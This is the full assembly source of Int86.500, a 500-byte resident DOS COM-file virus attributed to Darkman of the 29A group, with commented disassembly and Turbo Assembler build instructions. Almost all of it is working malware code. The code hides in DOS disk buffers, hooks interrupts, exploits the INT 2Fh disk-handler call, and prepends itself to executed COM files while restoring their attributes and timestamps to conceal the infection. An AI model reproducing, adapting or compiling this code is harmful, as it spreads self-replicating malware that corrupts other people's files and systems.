;              'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
;               º ****:::: Disassembly - Int86.500 ::::*** º
;               º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
;               º ********* -= Darkman / 29A =- ********** º
;              'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'


; Int86.500 is a 500 bytes parasitic resident COM virus. Infects files at pass
; command to command interpreter for execution by prepending the virus to
; infected file. Int86.500 is using the interrupt 2fh (multiplex) set disk
; interrupt handler DOS exploit.

; To compile Int86.500 with Turbo Assembler v 4.0 type:
;   TASM /M INT86.ASM
;   TLINK /x INT86.OBJ
;   EXE2BIN INT86.EXE INT86.COM


.model tiny
.code

code_begin:
	     push    ax 		 ; Save AX at stack

	     mov     ah,30h		 ; Get DOS version
	     int     21h
	     xchg    ah,al		 ; Exchange DOS version number
	     mov     [dos_version+100h],ax

	     mov     ax,352eh		 ; Get interrupt vector 2eh
	     int     21h

	     cmp     [dos_version+100h],31eh
	     jne     virus_exit 	 ; DOS version 3.30? Jump to virus_...

	     mov     ah,52h		 ; Get list of lists
	     int     21h

	     push    es bx		 ; Save registers at stack
	     mov     ax,es:[bx+14h]	 ; AX = segment of first disk buffe...
	     mov     [first_buffer+100h],ax

	     push    [first_buffer+100h] ; Save segment of first disk buffe...
	     pop     es 		 ; Load ES from stack (segment of f...

	     mov     ax,es:[02h]	 ; AX = segment of next disk buffer...
	     mov     [next_buffer+100h],ax

	     push    ax 		 ; Save AX at stack
	     pop     es 		 ; Load ES from stack (AX)

	     mov     ax,es:[02h]	 ; AX = segment of next disk buffer...
	     pop     bx es		 ; Load registers from stack

	     mov     es:[bx+14h],ax	 ; Store segment of first disk buff...
	     mov     es,[first_buffer+100h]

	     xor     di,di		 ; Zero DI
	     mov     si,100h		 ; SI = offset of beginning of code
	     mov     cx,(code_end-code_begin)
	     cld			 ; Clear direction flag
	     rep     movsb		 ; Move virus to first disk buffer ...

	     mov     ax,352eh		 ; Get interrupt vector 2eh
	     int     21h

	     mov     ax,86h		 ; AX = interrupt of Int86.500
	     mov     es:[12eh],ax	 ; Store interrupt of Int86.500

	     lea     dx,int86_virus	 ; DX = offset of int86_virus

	     push    [first_buffer+100h] ; Save segment of first disk buffe...
	     pop     ds 		 ; Load DS from stack (segment of f...

	     mov     ax,2586h		 ; Set interrupt vector 86h
	     int     21h
virus_exit:
	     mov     ax,3586h		 ; Get interrupt vector 86h
	     int     21h

	     push    es 		 ; Save ES at stack
	     pop     cs:[restore_seg+100h]

	     push    cs 		 ; Save CS at stack
	     push    cs:[origin_off+100h]

	     db      0eah		 ; JMP imm32 (opcode 0eah)
	     dw      restore		 ; Offset of restore
restore_seg  dw      ?			 ; Segment of restore
restore:
	     cld			 ; Clear direction flag
	     pop     si 		 ; Load SI from stack
	     add     si,100h		 ; SI = offset of original code

	     pop     es 		 ; Load ES from stack (CS)
	     push    es 		 ; Save ES at stack
	     pop     ds 		 ; Load DS from stack (CS)
	     push    ds 		 ; Save DS at stack

	     pop     cs:[virus_seg]	 ; Load segment of the virus from st...
	     mov     cx,(code_end-code_begin)
	     mov     di,100h		 ; DI = offset of beginning of code
	     rep     movsb		 ; Move original code to beginning ...

	     pop     ax 		 ; Load AX from stack

	     db      0eah		 ; JMP imm32 (opcode 0eah)
	     dw      100h		 ; Offset of beginning of code
virus_seg    dw      ?			 ; Segment of the virus

int86_virus  proc    near		 ; Interrupt 86 of Int86.500
	     push    ax bx cx dx di ds es

	     push    ds dx		 ; Save registers at stack
	     xor     ax,ax		 ; Zero AX
	     mov     es,ax		 ; ES = segment of interrupt table
	     mov     ax,es:[13h*04h]	 ; AX = offset of interrupt 13h
	     mov     word ptr cs:[int13_addr],ax
	     mov     ax,es:[13h*04h+02h] ; AX = segment of interrupt 13h
	     mov     word ptr cs:[int13_addr+02h],ax

	     mov     ah,13h		 ; Set disk interrupt handler
	     int     2fh

	     push    ds dx		 ; Save registers at stack
	     mov     ah,13h		 ; Set disk interrupt handler
	     int     2fh
	     pop     dx ds		 ; Load registers from stack

	     xor     ax,ax		 ; Zero AX
	     mov     es,ax		 ; ES = segment of interrupt table
	     mov     es:[13h*04h],dx	 ; Store offset of interrupt 13h
	     mov     es:[13h*04h+02h],ds ; Store segment of interrupt 13h
	     pop     dx ds		 ; Load registers from stack

	     mov     ax,4300h		 ; Get file attributes
	     int     21h
	     push    cx dx ds		 ; Save registers at stack

	     mov     ax,4301h		 ; Set file attributes
	     xor     cx,cx		 ; CX = new file attributes
	     int     21h

	     mov     ax,3d02h		 ; Open file (read/write)
	     int     21h
	     xchg    ax,bx		 ; BX = file handle

	     push    cs:[next_buffer]	 ; Save segment of next disk buffer...
	     pop     ds 		 ; Load DS from stack (segment of n...

	     xor     dx,dx		 ; Zero DX
	     mov     cx,(code_end-code_begin)
	     mov     ah,3fh		 ; Read from file
	     int     21h

	     cmp     ds:[00h],'ZM'       ; Found EXE signature?
	     je      infect_exit	 ; Equal? Jump to infect_exit

	     mov     ax,4202h		 ; Set current file position (EOF)
	     xor     cx,cx		 ; Zero CX
	     int     21h
	     mov     cs:[origin_off],ax  ; Store offset of original code

	     cmp     ah,02h		 ; Filesize too small?
	     jbe     infect_exit	 ; Below or equal? Jump to infect_exit
	     cmp     ah,0f6h		 ; Filesize too large?
	     jae     infect_exit	 ; Above or equal? Jump to infect_exit

	     mov     ah,54h		 ; Get verify flag
	     int     21h
	     push    ax 		 ; Save AX at stack

	     xor     ax,ax		 ; Zero AX
	     mov     ah,2eh		 ; Set verify flag (off)
	     xor     dx,dx		 ; Zero DX
	     int     21h

	     mov     ax,5700h		 ; Get file's date and time
	     int     21h
	     push    cx dx		 ; Save registers at stack

	     xor     dx,dx		 ; Zero DX
	     mov     ah,40h		 ; Write to file
	     mov     cx,(code_end-code_begin)
	     int     21h

	     mov     ax,4200h		 ; Set current file position (SOF)
	     xor     cx,cx		 ; Zero CX
	     int     21h

	     push    cs 		 ; Save CS at stack
	     pop     ds 		 ; Load DS from stack (CS)

	     mov     cx,(code_end-code_begin)
	     mov     ah,40h		 ; Write to file
	     int     21h

	     pop     dx cx		 ; Load registers from stack
	     mov     ax,5701h		 ; Set file's date and time
	     int     21h

	     pop     ax 		 ; Load AX from stack
	     xor     dx,dx		 ; Zero DX
	     mov     ah,2eh		 ; Set verify flag (off)
	     int     21h
infect_exit:
	     mov     ah,3eh		 ; Close file
	     int     21h

	     pop     ds dx cx		 ; Load registers from stack
	     mov     ax,4301h		 ; Set file attributes
	     int     21h

	     xor     ax,ax		 ; Zero AX
	     mov     es,ax		 ; ES = segment of interrupt table
	     mov     ax,word ptr cs:[int13_addr]
	     mov     es:[13h*04h],ax	 ; Store offset of interrupt 13h
	     mov     ax,word ptr cs:[int13_addr+02h]
	     mov     es:[13h*04h+02h],ax ; Store segment of interrupt 13h

	     pop     es ds di dx cx bx ax

	     int     21h

	     iret			 ; Interrupt return!
	     endp

int13_addr   dd      ?			 ; Address of interrupt 13h
next_buffer  dw      ?			 ; Segment of next disk buffer in b...
dos_version  dw      ?			 ; DOS version number
origin_off   dw      ?			 ; Offset of original code
first_buffer dw      ?			 ; Segment of first disk buffer in ...
	     db      72h dup(?)
code_end:
	     int     20h		 ; Terminate program

end	     code_begin
